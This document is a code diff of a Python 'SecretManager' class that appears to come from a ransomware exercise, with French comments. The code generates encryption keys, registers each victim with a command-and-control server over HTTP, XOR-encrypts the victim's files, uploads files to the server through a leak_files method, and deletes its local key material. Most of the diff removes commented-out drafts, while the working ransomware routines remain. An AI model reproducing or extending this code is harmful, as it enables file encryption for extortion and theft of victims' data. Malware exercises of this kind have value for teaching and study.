@@ -29,9 +29,6 @@ class SecretManager:
         self._token = None
 
         self._log = logging.getLogger(self.__class__.__name__)
-
-    #def do_derivation(self, salt:bytes, key:bytes)->bytes:
-        #raise NotImplemented()
     
     
     def do_derivation(self, salt: bytes, key: bytes) -> bytes:
@@ -60,17 +57,10 @@ class SecretManager:
 
         return salt, private_key, derived_key
 
-    #def create(self)->Tuple[bytes, bytes, bytes]:
-       # raise NotImplemented()
-
 
     def bin_to_b64(self, data:bytes)->str:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
-
-    #def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        #raise NotImplemented()
     
 
     def post_new(self, salt: bytes, key: bytes, token: bytes) ->int:
@@ -91,89 +81,29 @@ class SecretManager:
         cnc_url = f"http://{self._remote_host_port}/new?label={dir_label}" 
      
 
-
-
         # Envoie les données JSON au CNC
         response = requests.post(cnc_url, json=data)
         return response
 
-        # Vérifie la réponse du serveur
-        #if response.status_code == 200:
-            #print("Données cryptographiques envoyées avec succès.")
-        #else:
-            #print(f"Échec de l'envoi des données. Code de réponse : {response.status_code}")
+      
+    
 
-    #def bin_to_b64(self, data: bytes) -> str:
-        # Convertit des bytes en chaîne Base64
-        #return base64.b64encode(data).decode('utf-8')
-
-
-    #def setup(self)->None:
-        # main function to create crypto data and register malware to cnc
-        #raise NotImplemented()
-
-
-   # def setup(self) -> None:
-        # Génére un salt aléatoire
-        salt = os.urandom(self.SALT_LENGTH)
-
-        # Génére une clé privée aléatoire
-        private_key = os.urandom(self.KEY_LENGTH)
-
-        # Effectue la dérivation de la clé privée
-        derived_key = self.do_derivation(salt,private_key)
-
-     
-        # Sauvegarde le salt et la clé 
-        #salt_file_path = os.path.join(self._path, 'salt.bin')
-        salt_file_path = os.path.join(f"{self._path}/token" , 'salt.bin')
-
-        #token_file_path = os.path.join(self._path, 'token.bin')
-        token_file_path = os.path.join(f"{self._path}/token" , 'token.bin')
-
-
-
-        with open(salt_file_path, 'wb') as salt_file:
-            salt_file.write(salt)
-
-        with open(token_file_path, 'wb') as token_file:
-            token_file.write(derived_key)
-
-        # Envoye les données cryptographiques au CNC
-        params = {'token': hashlib.sha256(derived_key).hexdigest()}
-        body = {
-            'salt': base64.b64encode(salt).decode('utf-8'),
-            'key': base64.b64encode(derived_key).decode('utf-8')
-        }
-
-        response = self.post_new(self._path, params, body)
-
-        if 'message' in response:
-            print(response['message'])
-        else:
-            print(response['error'])
-
+   
     def setup(self) -> None:
         # main function to create crypto data and register malware to cnc
 
-        # creation of crypto data and assignment to member variables
+        # creation des données crypto
         self._salt , self._key, self._token= self.create()
         
         
-        # post request of said data
+       
         post_status_code = self.post_new(self._salt, self._key, self._token)
 
-        # we can display the returned status_code to check that everything worked
+        # affiche le resultat du statut
         self._log.debug("post_new request returned with code " + str(post_status_code))
+    
         
-        #token_path = f"{self._path}/token"
-        #if not Path(token_path).exists():  
-           # Path(token_path).mkdir(parents=True, exist_ok=False)
-        #if Path(f"{token_path}/token.bin").exists():
-            #raise FileExistsError
-        
-        # open taking parameter 'wb' allows the program to write into a binary file
-        
+        # open prend en paramètre  'wb' qui permet au program d'ecrire en fichier binaire 
         with open(os.path.join(self._path, "_token.bin"), "wb") as tokenfile:
             tokenfile.write(self._token)
         with open(os.path.join(self._path, "_salt.bin"), "wb") as saltfile:
@@ -181,39 +111,7 @@ class SecretManager:
 
         return None
 
-    #def setup(self) -> None:
-        # Vérifie la connexion au CNC
-        try:
-            url = f"http://{self._remote_host_port}/ping"
-            response = requests.get(url)
-            if response.status_code != 200:
-                raise ConnectionError("CNC is unreachable")
-        except ConnectionError as e:
-            raise e
-
-        # Vérifie si les fichiers token et salt existent
-        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
-            raise FileExistsError("A _token.bin file already exists. Cancelling setup.")
-
-        # Crée les éléments cryptographiques
-        self._salt, self._key, self._token,self.timestamp = self.create()
-
-        # Crée le répertoire si nécessaire
-        os.makedirs(self._path, exist_ok=True)
-        # Sauvegarde localement le sel et le jeton
-        with open(os.path.join(self._path, "_salt.bin"), "wb") as salt_file:
-            salt_file.write(self._salt)
-        with open(os.path.join(self._path, "_token.bin"), "wb") as token_file:
-            token_file.write(self._token)
-        
-        # Envoie les éléments cryptographiques au CNC
-        self.post_new(self._salt, self._key, self._token)
-
-    #def load(self)->None:
-        # function to load crypto data
-        #raise NotImplemented()
-    
-
+ 
     def load(self) -> None:
         # Charge le salt depuis le fichier local
         salt_file_path = os.path.join(self._path, 'salt.bin')
@@ -231,12 +129,6 @@ class SecretManager:
         else:
             print("Le fichier de token n'existe pas. Assurez-vous de l'avoir généré auparavant.")
 
-
-
-    #def check_key(self, candidate_key:bytes)->bool:
-        # Assert the key is valid
-        #raise NotImplemented()
-    
 
   
 
@@ -269,34 +161,6 @@ class SecretManager:
         return hex_token
 
 
-    #def xorfiles(self, files:List[str])->None:
-        # xor a list for file
-        #raise NotImplemented()
-
-
-    #def xorfiles(self, files: List[str]) -> None:
-        if not self._key:
-            print("La clé n'est pas définie. Veuillez d'abord générer une clé.")
-            return
-
-        for file_path in files:
-            if not os.path.exists(file_path):
-                print(f"Le fichier {file_path} n'existe pas.")
-                continue
-
-            encrypted_file_path = f"{file_path}.encrypted"
-            with open(file_path, 'rb') as input_file:
-                with open(encrypted_file_path, 'wb') as output_file:
-                    file_data = input_file.read()
-                    key_length = len(self._key)
-
-                    for i in range(len(file_data)):
-                        # Utilisation la clé pour effectuer le chiffrement XOR
-                        encrypted_byte = file_data[i] ^ self._key[i % key_length]
-                        output_file.write(bytes([encrypted_byte]))
-
-            print(f"Le fichier {file_path} a été chiffré et enregistré sous {encrypted_file_path}.")
-
 
     def xorfiles(self, files: List[str]) -> None:
         for file_path in files:
@@ -304,12 +168,6 @@ class SecretManager:
                 xorfile(file_path, self._key)
             except Exception as e:
                 self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")
-
-
-    #def leak_files(self, files:List[str])->None:
-        # send file, geniune path and token to the CNC
-        #raise NotImplemented()
-    
 
     def leak_files(self, files: List[str]) -> None:
         # send files to the CNC
@@ -334,25 +192,21 @@ class SecretManager:
                 requests.post(folder_url, json=file_json, headers=header)
         return None
 
-
-    #def clean(self):
-        # remove crypto data from the target
-        #raise NotImplemented()
  
 
     def clean(self) -> None:
-        # Supprimerle fichier de salt
-        salt_file_path = os.path.join(self._path, 'salt.bin')
+        # Supprime le fichier de salt
+        saltfilepath = os.path.join(self._path, 'salt.bin')
         try:
-            os.remove(salt_file_path)
+            os.remove(saltfilepath)
             print("Le fichier de sel a été supprimé avec succès.")
         except FileNotFoundError:
             print("Le fichier de sel n'existe pas.")
 
         # Supprime le fichier de token
-        token_file_path = os.path.join(self._path, 'token.bin')
+        tokenfilepath = os.path.join(self._path, 'token.bin')
         try:
-            os.remove(token_file_path)
+            os.remove(tokenfilepath)
             print("Le fichier de token a été supprimé avec succès.")
         except FileNotFoundError:
             print("Le fichier de token n'existe pas.")
